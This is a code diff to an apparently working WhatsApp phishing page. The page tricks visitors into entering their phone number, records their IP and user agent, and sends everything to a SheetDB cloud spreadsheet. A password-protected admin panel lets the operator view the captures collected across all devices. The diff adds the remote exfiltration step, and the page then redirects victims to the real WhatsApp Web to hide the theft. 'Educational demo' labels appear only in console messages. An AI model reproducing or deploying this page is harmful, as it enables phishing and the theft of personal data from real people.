@@ -229,10 +229,6 @@
             text-decoration: none;
         }
 
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
         /* Admin Panel Styles */
         .admin-badge {
             position: fixed;
@@ -273,7 +269,7 @@
             background: white;
             border-radius: 20px;
             max-width: 90%;
-            width: 800px;
+            width: 900px;
             max-height: 80%;
             overflow: auto;
             padding: 20px;
@@ -339,19 +335,32 @@
             background: #f8f9fa;
         }
 
-        .clear-btn {
-            background: #dc3545;
+        .refresh-btn {
+            background: #25D366;
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 8px 20px;
             border-radius: 8px;
             cursor: pointer;
-            margin-top: 15px;
+            margin-bottom: 15px;
             font-size: 14px;
         }
 
-        .clear-btn:hover {
-            background: #c82333;
+        .refresh-btn:hover {
+            background: #128C7E;
+        }
+
+        .sheet-link {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .sheet-link a {
+            color: #075e54;
+            font-weight: bold;
         }
 
         @media (max-width: 480px) {
@@ -431,21 +440,32 @@
     <div class="modal" id="adminModal">
         <div class="modal-content">
             <div class="modal-header">
-                <h2>📊 Admin Panel - Captured Data</h2>
+                <h2>📊 Admin Panel - Captured Data (All Devices)</h2>
                 <button class="close-modal" id="closeModal">&times;</button>
             </div>
+            <button class="refresh-btn" id="refreshData">🔄 Refresh Data</button>
             <div id="adminContent">
-                <!-- Data will be displayed here -->
+                <div style="text-align: center; padding: 40px; color: #999;">
+                    <div style="font-size: 48px; margin-bottom: 20px;">📭</div>
+                    <p>Loading data from cloud database...</p>
+                </div>
+            </div>
+            <div class="sheet-link" id="sheetLink">
+                <!-- Sheet link will appear here -->
             </div>
         </div>
     </div>
 
     <script>
-        // Store captured data in localStorage
+        // ========== SHEETDB CONFIGURATION ==========
+        // REPLACE THIS WITH YOUR ACTUAL SHEETDB API URL
+        const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/7c2ws0epjm7hi';
+        
+        // Also save locally for backup
         let capturedData = [];
 
-        // Load existing data from localStorage
-        function loadData() {
+        // Load existing data from localStorage (backup)
+        function loadLocalData() {
             const saved = localStorage.getItem('whatsapp_phisher_data');
             if (saved) {
                 capturedData = JSON.parse(saved);
@@ -454,84 +474,146 @@
             }
         }
 
-        // Save data to localStorage
-        function saveData() {
+        // Save data to localStorage (backup)
+        function saveLocalData() {
             localStorage.setItem('whatsapp_phisher_data', JSON.stringify(capturedData));
         }
 
+        // Save to SheetDB (Cloud Database)
+        async function saveToSheetDB(phone, ip, userAgent) {
+            try {
+                const response = await fetch(SHEETDB_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        data: [{
+                            "ID": Date.now(),
+                            "Timestamp": new Date().toLocaleString(),
+                            "Phone Number": phone,
+                            "IP Address": ip,
+                            "User Agent": userAgent.substring(0, 100)
+                        }]
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Saved to SheetDB:', result);
+                return true;
+            } catch (error) {
+                console.error('SheetDB Error:', error);
+                return false;
+            }
+        }
+
+        // Load all data from SheetDB
+        async function loadFromSheetDB() {
+            try {
+                const response = await fetch(SHEETDB_API_URL);
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error loading from SheetDB:', error);
+                return [];
+            }
+        }
+
         // Add new captured phone number
-        function addCapturedData(phone, ip) {
+        async function addCapturedData(phone, ip, userAgent) {
+            // Save to cloud (SheetDB)
+            const cloudSaved = await saveToSheetDB(phone, ip, userAgent);
+            
+            // Also save locally as backup
             const newEntry = {
                 id: capturedData.length + 1,
                 timestamp: new Date().toLocaleString(),
                 phone: phone,
-                ip: ip
+                ip: ip,
+                userAgent: userAgent.substring(0, 100)
             };
-            capturedData.unshift(newEntry); // Add to beginning
-            saveData();
-            return newEntry;
+            capturedData.unshift(newEntry);
+            saveLocalData();
+            
+            return cloudSaved;
         }
 
-        // Clear all data
-        function clearAllData() {
-            if (confirm('⚠️ Are you sure you want to delete ALL captured data? This cannot be undone.')) {
-                capturedData = [];
-                saveData();
-                renderAdminPanel();
-                showStatus('All data cleared!', 'info');
-            }
-        }
-
-        // Render admin panel
-        function renderAdminPanel() {
+        // Render admin panel from cloud data
+        async function renderAdminPanel() {
             const adminContent = document.getElementById('adminContent');
             
-            if (capturedData.length === 0) {
+            try {
+                const data = await loadFromSheetDB();
+                
+                if (!data || data.length === 0 || (data.length === 1 && !data[0]["Phone Number"])) {
+                    adminContent.innerHTML = `
+                        <div style="text-align: center; padding: 40px; color: #999;">
+                            <div style="font-size: 48px; margin-bottom: 20px;">📭</div>
+                            <p>No data captured yet</p>
+                            <p style="font-size: 12px; margin-top: 10px;">Share your link and wait for submissions</p>
+                            <p style="font-size: 11px; margin-top: 5px; color: #075e54;">Data will appear here from ALL devices!</p>
+                        </div>
+                    `;
+                    return;
+                }
+                
+                // Filter out empty rows
+                const validData = data.filter(row => row["Phone Number"] && row["Phone Number"] !== "");
+                
+                let html = `
+                    <div style="margin-bottom: 20px;">
+                        <strong style="font-size: 18px;">📊 Total Captured: ${validData.length}</strong>
+                        <p style="font-size: 12px; color: #666; margin-top: 5px;">Data from ALL devices that visited your link</p>
+                    </div>
+                    <table class="admin-table">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Timestamp</th>
+                                <th>Phone Number</th>
+                                <th>IP Address</th>
+                                <th>User Agent</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                `;
+                
+                validData.reverse().forEach((row, index) => {
+                    html += `
+                        <tr>
+                            <td>${index + 1}</td>
+                            <td>${row["Timestamp"] || row.timestamp || '-'}</td>
+                            <td style="font-weight: bold; color: #075e54;">${row["Phone Number"] || row.phone || '-'}</td>
+                            <td>${row["IP Address"] || row.ip || '-'}</td>
+                            <td style="font-size: 11px;">${(row["User Agent"] || row.userAgent || '-').substring(0, 50)}...</td>
+                        </tr>
+                    `;
+                });
+                
+                html += `
+                        </tbody>
+                    </table>
+                `;
+                
+                adminContent.innerHTML = html;
+                
+                // Show Google Sheet link
+                const sheetLink = document.getElementById('sheetLink');
+                sheetLink.innerHTML = `
+                    <strong>📎 View Full Data in Google Sheets:</strong><br>
+                    <a href="#" id="googleSheetUrl" target="_blank">Click to open your Google Sheet</a>
+                    <p style="font-size: 11px; margin-top: 8px;">Data is automatically saved to your Google Sheet in real-time!</p>
+                `;
+                
+            } catch (error) {
                 adminContent.innerHTML = `
                     <div style="text-align: center; padding: 40px; color: #999;">
-                        <div style="font-size: 48px; margin-bottom: 20px;">📭</div>
-                        <p>No data captured yet</p>
-                        <p style="font-size: 12px; margin-top: 10px;">Share the link and wait for submissions</p>
+                        <div style="font-size: 48px; margin-bottom: 20px;">⚠️</div>
+                        <p>Error loading data</p>
+                        <p style="font-size: 12px;">Check your SheetDB API URL</p>
                     </div>
-                    <button class="clear-btn" onclick="clearAllData()" style="display: none;">Clear All Data</button>
                 `;
-                return;
             }
-
-            let html = `
-                <div style="margin-bottom: 20px;">
-                    <strong>Total Captured: ${capturedData.length}</strong>
-                    <button class="clear-btn" onclick="clearAllData()" style="margin-left: 15px;">🗑️ Clear All</button>
-                </div>
-                <table class="admin-table">
-                    <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>Timestamp</th>
-                            <th>Phone Number</th>
-                            <th>IP Address</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-            `;
-
-            capturedData.forEach(entry => {
-                html += `
-                    <tr>
-                        <td>${entry.id}</td>
-                        <td>${entry.timestamp}</td>
-                        <td style="font-weight: bold; color: #075e54;">${entry.phone}</td>
-                        <td>${entry.ip}</td>
-                    </tr>
-                `;
-            });
-
-            html += `
-                    </tbody>
-                </table>
-            `;
-
-            adminContent.innerHTML = html;
         }
 
         // Show status message
@@ -545,7 +627,7 @@
             }, 3000);
         }
 
-        // Get visitor IP (using free API)
+        // Get visitor IP
         async function getVisitorIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -564,12 +646,12 @@
             const phone = phoneInput.value.trim();
 
             if (!phone) {
-                showStatus('Please enter your phone number', 'error');
+                showStatus('Please enter your phone number(+255...)', 'error');
                 return;
             }
 
             if (phone.length < 9 || !/^[0-9+\-\s()]+$/.test(phone)) {
-                showStatus('Please enter a valid phone number', 'error');
+                showStatus('Please enter a valid phone number with counrty code', 'error');
                 return;
             }
 
@@ -577,25 +659,22 @@
             submitBtn.innerHTML = '<span>Verifying...</span><span>⏳</span>';
 
             try {
-                // Get IP address
+                // Get IP address and user agent
                 const ip = await getVisitorIP();
+                const userAgent = navigator.userAgent;
                 
-                // Save data
-                addCapturedData(phone, ip);
-                
-                // Update admin panel
-                renderAdminPanel();
+                // Save to cloud database
+                await addCapturedData(phone, ip, userAgent);
                 
                 // Show success message
                 showStatus('✓ Verification successful! Redirecting...', 'success');
                 
-                // Log to console for educational purposes
                 console.log('[Educational Demo] Phone captured:', phone);
-                console.log('[Educational Demo] Total captures:', capturedData.length);
+                console.log('[Educational Demo] Data saved to cloud!');
                 
                 // Redirect to real WhatsApp after 2 seconds
                 setTimeout(() => {
-                    window.location.href = 'https://officials.whatsapp.com';
+                    window.location.href = 'https://web.whatsapp.com';
                 }, 2000);
                 
             } catch (error) {
@@ -616,8 +695,8 @@
         const adminBadge = document.getElementById('adminBadge');
         const adminModal = document.getElementById('adminModal');
         const closeModal = document.getElementById('closeModal');
+        const refreshBtn = document.getElementById('refreshData');
 
-        // Admin password
         const ADMIN_PASSWORD = 'Phishing3694';
 
         adminBadge.addEventListener('click', () => {
@@ -631,11 +710,14 @@
             }
         });
 
+        refreshBtn.addEventListener('click', () => {
+            renderAdminPanel();
+        });
+
         closeModal.addEventListener('click', () => {
             adminModal.classList.remove('active');
         });
 
-        // Close modal when clicking outside
         adminModal.addEventListener('click', (e) => {
             if (e.target === adminModal) {
                 adminModal.classList.remove('active');
@@ -643,14 +725,24 @@
         });
 
         // Initialize
-        loadData();
-        renderAdminPanel();
+        loadLocalData();
+        
+        // Test SheetDB connection on load
+        async function testConnection() {
+            const test = await loadFromSheetDB();
+            if (test && test.length > 0) {
+                console.log('✅ SheetDB Connected!', test.length, 'records found');
+            } else {
+                console.log('📭 SheetDB Connected - No data yet');
+            }
+        }
+        testConnection();
 
-        // Add console message
+        // Console message
         console.log('%c⚠️ EDUCATIONAL DEMO - WhatsApp Phishing Simulation', 'color: #ff6b6b; font-size: 14px; font-weight: bold;');
-        console.log('%cThis is for educational purposes only. Learn how phishing works to protect yourself.', 'color: #4ecdc4; font-size: 12px;');
-        console.log('%cAdmin Panel Access: Click the bottom right badge → Password: admin123', 'color: #ffe66d; font-size: 12px;');
-        console.log('%cCaptured data is stored locally in your browser (localStorage)', 'color: #95e77e; font-size: 12px;');
+        console.log('%cThis is for educational purposes only.', 'color: #4ecdc4; font-size: 12px;');
+        console.log('%c📊 DATA IS SAVED TO CLOUD - VISIBLE FROM ALL DEVICES!', 'color: #95e77e; font-size: 12px; font-weight: bold;');
+        console.log('%cAdmin Panel Access: Click bottom right badge → Password: Phishing3694', 'color: #ffe66d; font-size: 12px;');
     </script>
 </body>
 </html>
